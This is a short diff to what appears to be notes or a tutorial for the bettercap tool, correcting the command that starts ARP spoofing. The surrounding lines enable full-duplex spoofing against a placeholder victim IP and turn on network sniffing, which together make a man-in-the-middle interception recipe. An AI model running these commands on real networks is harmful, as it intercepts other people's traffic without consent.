@@ -10,7 +10,7 @@
     arp.spoof.fullduplex true 
     
     set arp.spoof.targets [ vigtim ip]
-    set arp.spoof on
+    arp.spoof on
     net.sniff on
 
     
